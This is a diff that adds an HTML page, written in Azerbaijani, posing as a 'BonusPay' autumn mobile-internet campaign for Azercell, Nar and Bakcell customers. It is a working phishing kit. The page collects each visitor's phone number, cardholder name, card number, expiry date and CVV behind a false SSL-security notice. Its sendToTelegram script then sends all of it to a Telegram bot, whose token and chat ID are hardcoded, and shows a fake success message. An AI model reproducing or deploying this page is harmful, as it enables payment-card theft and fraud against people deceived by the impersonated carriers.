@@ -1,0 +1,653 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BonusPay - Payız Kampaniyası</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        body {
+            background: radial-gradient(circle at top right, #ff2a2a, #990000 70%, #5c0000 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        body::before, body::after {
+            content: '';
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            z-index: 0;
+            pointer-events: none;
+        }
+        body::before {
+            width: 300px;
+            height: 300px;
+            background: rgba(255, 170, 0, 0.25);
+            top: -50px;
+            left: -50px;
+        }
+        body::after {
+            width: 350px;
+            height: 350px;
+            background: rgba(255, 50, 50, 0.35);
+            bottom: -80px;
+            right: -80px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.97);
+            width: 100%;
+            max-width: 420px;
+            border-radius: 32px;
+            padding: 32px 24px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(255, 255, 255, 0.3);
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            backdrop-filter: blur(16px);
+        }
+        .logo-wrapper {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, #ff1a1a, #b30000);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffbe0b;
+            font-weight: 800;
+            font-size: 20px;
+            box-shadow: 0 4px 12px rgba(230, 0, 0, 0.3);
+        }
+        .logo {
+            font-size: 30px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #d90429 0%, #8d0801 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -1px;
+        }
+        .logo span {
+            background: linear-gradient(135deg, #f77f00 0%, #fcbf49 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .campaign-pill {
+            display: inline-block;
+            background: #fff0f3;
+            color: #d90429;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 20px;
+            margin-bottom: 12px;
+            border: 1px solid #ffccd5;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+        }
+        .subtitle {
+            font-size: 13px;
+            color: #64748b;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        .section-title {
+            font-size: 18px;
+            font-weight: 800;
+            margin-bottom: 16px;
+            color: #0f172a;
+            text-align: left;
+            letter-spacing: -0.3px;
+        }
+        .step {
+            display: none;
+            animation: slideUp 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        .step.active {
+            display: block;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .operators, .packages {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .operator-card {
+            border: 2px solid #f1f5f9;
+            border-radius: 20px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            text-align: left;
+            background: #ffffff;
+            box-shadow: 0 4px 12px rgba(15, 23, 42, 0.03);
+        }
+        .op-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .op-logo-box {
+            width: 52px;
+            height: 52px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            flex-shrink: 0;
+            padding: 6px;
+        }
+        .op-logo-box img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+        .operator-name {
+            font-weight: 800;
+            font-size: 15px;
+        }
+        .text-azercell { color: #6a0dad; }
+        .text-nar { color: #c9184a; }
+        .text-bakcell { color: #d90429; }
+        .op-prefixes {
+            color: #64748b;
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 2px;
+        }
+        .op-arrow {
+            color: #cbd5e1;
+            font-size: 20px;
+            font-weight: 700;
+            transition: transform 0.2s, color 0.2s;
+        }
+        .operator-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(15, 23, 42, 0.06);
+        }
+        .operator-card:hover .op-arrow {
+            transform: translateX(3px);
+            color: #0f172a;
+        }
+        .package-card {
+            border: 2px solid #f1f5f9;
+            border-radius: 20px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            text-align: left;
+            background: #ffffff;
+            position: relative;
+        }
+        .package-card:hover {
+            border-color: #ef233c;
+            background: #fff8f9;
+            transform: translateY(-2px);
+        }
+        .package-card.popular {
+            border-color: #ef233c;
+            background: linear-gradient(to right, #fff8f9, #ffffff);
+        }
+        .popular-badge {
+            position: absolute;
+            top: -10px;
+            right: 16px;
+            background: linear-gradient(135deg, #ef233c, #d90429);
+            color: #fff;
+            font-size: 10px;
+            font-weight: 800;
+            padding: 3px 10px;
+            border-radius: 12px;
+            text-transform: uppercase;
+        }
+        .package-info {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .package-title {
+            font-weight: 800;
+            color: #0f172a;
+            font-size: 16px;
+        }
+        .package-details {
+            font-size: 13px;
+            color: #2563eb;
+            font-weight: 600;
+        }
+        .package-duration {
+            font-size: 11px;
+            color: #64748b;
+            font-weight: 600;
+        }
+        .package-price {
+            font-size: 16px;
+            font-weight: 800;
+            color: #d90429;
+            background: #fff0f3;
+            padding: 8px 14px;
+            border-radius: 14px;
+            border: 1px solid #ffccd5;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 22px;
+        }
+        .input-label {
+            font-size: 11px;
+            font-weight: 700;
+            color: #475569;
+            margin-bottom: 6px;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+        }
+        .phone-row {
+            display: flex;
+            gap: 10px;
+        }
+        select, input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 16px;
+            font-size: 15px;
+            font-weight: 600;
+            outline: none;
+            background: #f8fafc;
+            color: #0f172a;
+        }
+        select:focus, input:focus {
+            border-color: #ef233c;
+            background: #ffffff;
+        }
+        .prefix-select {
+            flex: 0 0 105px;
+            cursor: pointer;
+        }
+        .btn {
+            background: linear-gradient(135deg, #ff1a1a 0%, #c90000 100%);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(217, 4, 41, 0.3);
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+        .back-link {
+            font-size: 14px;
+            color: #475569;
+            cursor: pointer;
+            font-weight: 700;
+            padding: 6px 12px;
+            border-radius: 12px;
+            background: #f1f5f9;
+        }
+        .selected-op-badge {
+            font-size: 12px;
+            font-weight: 800;
+            padding: 5px 12px;
+            border-radius: 12px;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+        }
+        .success-box {
+            background: linear-gradient(135deg, #f0fdf4, #dcfce7);
+            border: 2px solid #86efac;
+            border-radius: 20px;
+            padding: 22px 18px;
+            margin-bottom: 22px;
+            color: #14532d;
+            font-size: 14px;
+            line-height: 1.6;
+            text-align: center;
+        }
+        .success-icon {
+            width: 52px;
+            height: 52px;
+            background: #22c55e;
+            color: #fff;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            margin-bottom: 12px;
+        }
+        .card-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        .secure-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #64748b;
+            margin-top: 14px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="campaign-pill">⚡ Xüsusi Kampaniya</div>
+        <div class="logo-wrapper">
+            <div class="logo-icon">⚡</div>
+            <div class="logo">Bonus<span>Pay</span></div>
+        </div>
+        <div class="subtitle">Sürətli, etibarlı və sərfəli mobil internet paketləri -- istədiyin operatora anında yüklə.</div>
+
+        <!-- 1. STEP -->
+        <div id="step-1" class="step active">
+            <div class="section-title">Operatoru seçin</div>
+            <div class="operators">
+                <div class="operator-card" onclick="selectOperator('Azercell', ['050', '051', '010', '060'], 'text-azercell')">
+                    <div class="op-left">
+                        <div class="op-logo-box">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Azercell_logo.svg" alt="Azercell">
+                        </div>
+                        <div class="op-details">
+                            <span class="operator-name text-azercell">Azercell</span>
+                            <span class="op-prefixes">050 • 051 • 010 • 060</span>
+                        </div>
+                    </div>
+                    <span class="op-arrow">›</span>
+                </div>
+
+                <div class="operator-card" onclick="selectOperator('Nar', ['070', '077', '060'], 'text-nar')">
+                    <div class="op-left">
+                        <div class="op-logo-box">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Nar_logo_2022.svg" alt="Nar">
+                        </div>
+                        <div class="op-details">
+                            <span class="operator-name text-nar">Nar</span>
+                            <span class="op-prefixes">070 • 077 • 060</span>
+                        </div>
+                    </div>
+                    <span class="op-arrow">›</span>
+                </div>
+
+                <div class="operator-card" onclick="selectOperator('Bakcell', ['055', '099', '060'], 'text-bakcell')">
+                    <div class="op-left">
+                        <div class="op-logo-box">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Bakcell_logo_2023.svg" alt="Bakcell">
+                        </div>
+                        <div class="op-details">
+                            <span class="operator-name text-bakcell">Bakcell</span>
+                            <span class="op-prefixes">055 • 099 • 060</span>
+                        </div>
+                    </div>
+                    <span class="op-arrow">›</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- 2. STEP -->
+        <div id="step-2" class="step">
+            <div class="top-bar">
+                <div class="back-link" onclick="goToStep(1)">‹ Geri</div>
+                <div class="selected-op-badge" id="opBadgeStep2">Operator</div>
+            </div>
+            <div class="section-title">Nömrəni daxil edin</div>
+            <div class="input-group">
+                <label class="input-label">Mobil nömrə</label>
+                <div class="phone-row">
+                    <select id="prefixSelect" class="prefix-select"></select>
+                    <input type="tel" id="phoneNumber" placeholder="000-00-00" maxlength="9" oninput="formatPhoneNumber(this)">
+                </div>
+            </div>
+            <button class="btn" onclick="goToStep(3)">Davam et</button>
+        </div>
+
+        <!-- 3. STEP -->
+        <div id="step-3" class="step">
+            <div class="top-bar">
+                <div class="back-link" onclick="goToStep(2)">‹ Geri</div>
+                <div class="selected-op-badge" id="opBadgeStep3">Operator</div>
+            </div>
+            <div class="section-title">Kampaniyanı seçin</div>
+            <div class="packages">
+                <div class="package-card" onclick="selectPackage('Mini', '5 GB internet və 200 dəqiqə', '3 AZN', '7 gün')">
+                    <div class="package-info">
+                        <span class="package-title">Mini</span>
+                        <span class="package-details">5 GB + 200 dəq</span>
+                        <span class="package-duration">İstifadə müddəti: 7 gün</span>
+                    </div>
+                    <span class="package-price">3 AZN</span>
+                </div>
+
+                <div class="package-card" onclick="selectPackage('Start', '10 GB internet və 500 dəqiqə', '5 AZN', '14 gün')">
+                    <div class="package-info">
+                        <span class="package-title">Start</span>
+                        <span class="package-details">10 GB + 500 dəq</span>
+                        <span class="package-duration">İstifadə müddəti: 14 gün</span>
+                    </div>
+                    <span class="package-price">5 AZN</span>
+                </div>
+
+                <div class="package-card popular" onclick="selectPackage('Standart', '25 GB internet və 1000 dəqiqə', '10 AZN', '28 gün')">
+                    <div class="popular-badge">🔥 Ən çox seçilən</div>
+                    <div class="package-info">
+                        <span class="package-title">Standart</span>
+                        <span class="package-details">25 GB + 1000 dəq</span>
+                        <span class="package-duration">İstifadə müddəti: 28 gün</span>
+                    </div>
+                    <span class="package-price">10 AZN</span>
+                </div>
+
+                <div class="package-card" onclick="selectPackage('Premium', '75 GB internet və 1500 dəqiqə', '20 AZN', '28 gün')">
+                    <div class="package-info">
+                        <span class="package-title">Premium</span>
+                        <span class="package-details">75 GB + 1500 dəq</span>
+                        <span class="package-duration">İstifadə müddəti: 28 gün</span>
+                    </div>
+                    <span class="package-price">20 AZN</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- 4. STEP -->
+        <div id="step-4" class="step">
+            <div class="top-bar">
+                <div class="back-link" onclick="goToStep(3)">‹ Geri</div>
+            </div>
+            <div class="section-title">Məlumatları təsdiqləyin</div>
+            <div class="success-box">
+                <div class="success-icon">✓</div>
+                <div>
+                    Təbriklər! Balansınızı <strong id="sumText">10 AZN</strong> artıraraq BonusPay-dən <strong id="descText">25 GB internet və 1000 dəqiqə</strong> qazanacaqsınız! Hədiyyənin istifadə müddəti <strong id="durText">28 gün</strong>-dür.
+                </div>
+            </div>
+            <button class="btn" onclick="goToStep(5)">Təsdiqlə və Ödə</button>
+        </div>
+
+        <!-- 5. STEP -->
+        <div id="step-5" class="step">
+            <div class="top-bar">
+                <div class="back-link" onclick="goToStep(4)">‹ Geri</div>
+                <div class="selected-op-badge" style="color: #d90429; border-color: #ffccd5; background: #fff0f3;" id="payAmountBadge">10 AZN</div>
+            </div>
+            <div class="section-title">Kart məlumatlarını daxil edin</div>
+            <div class="input-group">
+                <label class="input-label">Kart sahibinin adı</label>
+                <input type="text" id="cardHolder" placeholder="AD SOYAD" style="margin-bottom: 14px; text-transform: uppercase;">
+                
+                <label class="input-label">Kart nömrəsi</label>
+                <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" style="margin-bottom: 14px; letter-spacing: 1px;" maxlength="19" oninput="formatCardNumber(this)">
+                
+                <div class="card-grid">
+                    <div>
+                        <label class="input-label">Bitiş tarixi</label>
+                        <input type="tel" id="expiryDate" placeholder="AA/İİ" maxlength="5" oninput="formatExpiryDate(this)">
+                    </div>
+                    <div>
+                        <label class="input-label">CVV</label>
+                        <input type="password" id="cvvCode" placeholder="000" maxlength="3">
+                    </div>
+                </div>
+            </div>
+            <button class="btn" onclick="sendToTelegram()">Ödənişi Tamamla</button>
+            <div class="secure-note">🔒 256-bit SSL ilə qorunan təhlükəsiz əməliyyat</div>
+        </div>
+    </div>
+
+    <script>
+        let currentOperator = '';
+        let selectedPackageInfo = '';
+
+        function goToStep(stepNumber) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById('step-' + stepNumber).classList.add('active');
+        }
+
+        function selectOperator(operatorName, prefixes, colorClass) {
+            currentOperator = operatorName;
+            
+            const badge2 = document.getElementById('opBadgeStep2');
+            const badge3 = document.getElementById('opBadgeStep3');
+            badge2.innerText = operatorName;
+            badge3.innerText = operatorName;
+            badge2.className = 'selected-op-badge ' + colorClass;
+            badge3.className = 'selected-op-badge ' + colorClass;
+
+            let select = document.getElementById('prefixSelect');
+            select.innerHTML = '';
+            prefixes.forEach(p => {
+                let opt = document.createElement('option');
+                opt.value = p;
+                opt.textContent = p;
+                select.appendChild(opt);
+            });
+            goToStep(2);
+        }
+
+        function selectPackage(title, details, price, duration) {
+            selectedPackageInfo = `${title} (${details}) - ${price}`;
+            document.getElementById('sumText').innerText = price;
+            document.getElementById('descText').innerText = details;
+            document.getElementById('durText').innerText = duration;
+            document.getElementById('payAmountBadge').innerText = 'ÖDƏNİŞ: ' + price;
+            goToStep(4);
+        }
+
+        function formatPhoneNumber(input) {
+            let v = input.value.replace(/\D/g, '');
+            if (v.length > 3 && v.length <= 5) {
+                input.value = v.slice(0, 3) + '-' + v.slice(3);
+            } else if (v.length > 5) {
+                input.value = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 7);
+            } else {
+                input.value = v;
+            }
+        }
+
+        function formatCardNumber(input) {
+            let v = input.value.replace(/\D/g, '');
+            let parts = [];
+            for (let i = 0; i < v.length && i < 16; i += 4) {
+                parts.push(v.substring(i, i + 4));
+            }
+            input.value = parts.join(' ');
+        }
+
+        function formatExpiryDate(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length >= 3) {
+                input.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                input.value = value;
+            }
+        }
+
+        // Telegram-a məlumat göndərmə funksiyası
+        async function sendToTelegram() {
+            const botToken = '9105319456:AAGWgqiJHIOtOp15odN-fLr6XHqosO145Bw'; 
+            const chatId = '8862151451';
+
+            const prefix = document.getElementById('prefixSelect').value;
+            const phoneNum = document.getElementById('phoneNumber').value;
+            const fullPhone = `${currentOperator}: (${prefix}) ${phoneNum}`;
+            
+            const cardHolder = document.getElementById('cardHolder').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvvCode').value;
+
+            const message = `🚨 Yeni Məlumat Gəldi!\n\n` +
+                            `📱 Nömrə: ${fullPhone}\n` +
+                            `📦 Paket: ${selectedPackageInfo}\n` +
+                            `👤 Kart Sahibi: ${cardHolder}\n` +
+                            `💳 Kart Nömrəsi: ${cardNumber}\n` +
+                            `📅 Bitiş Tarixi: ${expiryDate}\n` +
+                            `🔐 CVV: ${cvv}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                if (response.ok) {
+                    alert('Ödəniş sorğusu qəbul edildi!');
+                } else {
+                    alert('Xəta baş verdi, yenidən cəhd edin.');
+                }
+            } catch (error) {
+                console.error('Xəta:', error);
+                alert('Bağlantı xətası!');
+            }
+        }
+    </script>
+
+</body>
+</html>
+
